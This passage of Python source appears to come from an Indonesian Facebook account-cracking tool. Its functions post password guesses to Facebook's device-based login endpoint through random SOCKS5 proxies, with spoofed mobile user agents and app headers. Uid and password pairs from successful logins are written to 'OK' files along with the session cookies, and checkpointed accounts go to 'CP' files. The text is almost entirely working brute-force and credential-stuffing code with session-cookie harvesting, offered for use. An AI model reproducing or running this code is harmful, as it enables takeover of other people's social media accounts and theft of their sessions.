			p = ses.get(f"https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",headers=headers1)
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"uid":uiz,
				"next":f"https://{link_okep}/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
				"pass":pw,
				"flow":"login_no_pin"}
			kuko = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			kuko += " m_pixel_ratio=2.625; wd=412x756"
			headers2 = {
				"Host": url,
				"connection": "keep-alive",
				"cache-control": "max-age=0",
				"save-data": "on",
				"origin": "https://"+link_okep,
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with": "com.facebook.katana",
				"dnt": "1",
				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
				"sec-ch-ua-platform": '"Android"',
				"sec-ch-ua-mobile": "?1",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"sec-fetch-user": "?1",
				"upgrade-insecure-requests": "1",
				"referer": f"https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
				"accept-encoding": "gzip, deflate br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post(f"https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=headers2, cookies={"cookie": kuko}, proxies=proxs, allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				if "no" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					cek_apk(ses,kuki)
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1
	
def mbasic(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; Qmobile_4Gplus; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Mobile; Tech_Pad_Kaios_One_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1","Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.187 Safari/537.36 Mozilla/5.0 (Mobile; Nokia 8000 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Edg/93.0.4577.63","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-45-051119;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LOGIC_LOGIC_B8K_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Linux; rv:48.0; U; US) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-50-091120;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; Digit_Digit4G_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	c_pw = len(pwr)
	runc= random.choice([K,M,U,O,B,H]) 
	sys.stdout.write("\r  %slupin ranger %s%s <-> %s %slive:%s %ssesi:%s "%(P,runc,HikmatXD,len(id2 or id4),H,ok,K,cp)); sys.stdout.flush()
	c_pw -=1
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks5://'+cuukk}
			ses.headers.update({'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://"+link_okep+"/v7.0/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': link_okep,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+link_okep+'/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2F'+link_okep+'%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f'https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				tree = Tree("\n                                            ")
				print(f'%s• %s• %sstatus crack  %s: %ssesi%s-%s'%(M,H,K,P,K,P,sekarang))
				tree.add("%suid pengguna  : %s%s"%(P,H,uiz))
				tree.add("%suid password  : %s%s"%(P,H,pw))
				tree.add("%stahun akun id : %s"%(P,tahun(uiz)))
				tree.add("%s%s"%(K,ua))
				cetak(tree)
#				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"}
				if "no" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree("                                            ")
					print('%s• %s• %sstatus crack %s: %slive%s-%s'%(B,K,H,P,H,P,sekarang))
					tree.add("%suid pengguna  : %s%s"%(P,H,uiz))
					tree.add("%suid password  : %s%s"%(P,H,pw))
					tree.add("%stahun akun id : %s"%(P,tahun(uiz)))
					tree.add("%s%s"%(H,kuki))
					tree.add("%s%s\n"%(K,ua))
					cetak(tree)
#					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
#					print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree("                                            ")
					print('%s• %s• %sstatus crack %s: %slive%s-%s'%(B,K,H,P,H,P,sekarang))
					tree.add("%suid pengguna  : %s%s"%(P,H,uiz))
					tree.add("%suid password  : %s%s"%(P,H,pw))
					tree.add("%stahun akun id : %s"%(P,tahun(uiz)))
					tree.add("%s%s"%(H,kuki))
					tree.add("%s%s\n"%(K,ua))
					cetak(tree)
#					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
#					print("\r %s*--> %s "%(H,kuki))
					cek_apk(ses,kuki)
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1
	
def free(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
#	uaku10 = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36","Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36","Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/19.0.1042.0 Safari/535.21","Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/19.0.1041.0 Safari/535.21","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11","Mozilla/5.0 (Windows NT 6.1; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.750.0 Safari/534.30"]
#	ua_ku = ["Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/E7FBAF","Mozilla/5.0 (Linux; Android 10; Redmi Note 7S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/377.0.0.22.107;]","Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]","Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 10; es-es; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.10.0-gn","Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro Build/QKQ1.190915.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 PKeyAuth/1.0","Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 EdgW/1.0"]
#	ua_kaiOS = ["Mozilla/5.0 (Mobile; ALCATEL 4056W; rv:84.0) Gecko/84.0 Firefox/84.0 KAIOS/3.0","Mozilla/5.0 (Mobile; ALCATEL A406DL; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; N139DL; rv:84.0) Gecko/84.0 Firefox/84.0 KAIOS/3.1","Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; ALCATEL 4052R; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-58-140422;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; ATT_U102AA; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.1","Mozilla/5.0 (Mobile; TCL 4056W; rv:84.0) Gecko/84.0 Firefox/84.0 KAIOS/3.0","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; ALCATEL 4056Z; rv:84.0) Gecko/84.0 Firefox/84.0 KAIOS/3.0","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-69-170322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; TCL 4056S; rv:84.0) Gecko/84.0 Firefox/84.0 KAIOS/3.0","Mozilla/5.0 (Mobile; ALCATEL 4052W; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2","Mozilla/5.0 (Mobile; LYF/F61F/LYF-F61F-000-02-44-060422; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LYF/F120B/LYF-F120B-001-02-62-191121;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; CKT_U102AC; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3","Mozilla/5.0 (Mobile; TCL 4056SPP; rv:84.0) Gecko/84.0 Firefox/84.0 KAIOS/3.0","Mozilla/5.0 (Mobile; LYF/F211S/LYF-F211S-000-02-53-290322; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; Nokia_8110_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1","Mozilla/5.0 (Mobile; ALCATEL 4052C; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2","Mozilla/5.0 (Mobile; ATT_EA211101; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; Nokia_2720_Flip; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2","Mozilla/5.0 (Mobile; LYF/F61F/LYF-F61F-000-02-24-171019; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5"]
#	ua_tambahan = ["Mozilla/5.0 (Mobile; TCL 4056L; rv:84.0) Gecko/84.0 Firefox/84.0 KAIOS/3.0","Mozilla/5.0 (Mobile; TCL 4056S; rv:84.0) Gecko/84.0 Firefox/84.0 KAIOS/3.0","Mozilla/5.0 (Mobile; TCL 4056SPP; rv:84.0) Gecko/84.0 Firefox/84.0 KAIOS/3.0","Mozilla/5.0 (Mobile; TCL 4056W; rv:84.0) Gecko/84.0 Firefox/84.0 KAIOS/3.0","Mozilla/5.0 (Mobile; ALCATEL 4056W; rv:84.0) Gecko/84.0 Firefox/84.0 KAIOS/3.0","Mozilla/5.0 (Mobile; ALCATEL 4056Z; rv:84.0) Gecko/84.0 Firefox/84.0 KAIOS/3.0","Mozilla/5.0 (Mobile; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0","Mozilla/5.0 (Mobile; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0","Mozilla/5.0 (Mobile; $LYF/$F30C/$LYF_F30C-000-09-07-191217; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0","Mozilla/5.0 (Mobile; LYF/F210Q/LYF-F210Q-000-00-10-111219; Android; rv:83.0) Gecko/83.0 Firefox/83.0 KAIOS/2.5 YouTube/1.92.52.J","Mozilla/5.0 (Mobile; LYF/F210Q/LYF-F210Q-000-00-10-111219; Android; rv:80.0) Gecko/80.0 Firefox/80.0 KAIOS/2.5 YouTube/1.92.52.J","Mozilla/5.0 (Mobile; rv:37.0; 4044V) Gecko/37.0 Firefox/37.0 KaiOS/1.0","Mozilla/5.0 (Mobile; LYF/F90M/LYF-F90M-000-02-26-310118; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0","Mozilla/5.0 (Mobile; ALCATEL4044C; rv:37.0) Gecko/37.0 Firefox/37.0 KaiOS/1.0","Mozilla/5.0 (Mobile; ALCATEL4044V; rv:37.0) Gecko/37.0 Firefox/37.0 KaiOS/1.0","Mozilla/5.0 (Mobile; LYF/F90M/LYF-F90M-000-02-23-181217; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0","Mozilla/5.0 (Mobile; ALCATEL4044O; rv:37.0) Gecko/37.0 Firefox/37.0 KaiOS/1.0","Mozilla/5.0 (Mobile; ALCATEL4044T; rv:37.0) Gecko/37.0 Firefox/37.0 KaiOS/1.0","Mozilla/5.0 (Mobile; LYF/F90M/LYF-F90M-000-02-17-270917; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0","Mozilla/5.0 (Mobile; LYF/F30C/LYF_F30C-000-09-21-021018; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0","Mozilla/5.0 (Mobile; LYF/F101K/LYF-F101K-000-01-39-130818;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0","Mozilla/5.0 (Mobile; LYF/F81E/LYF-F81E-000-01-21-100818; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0"]
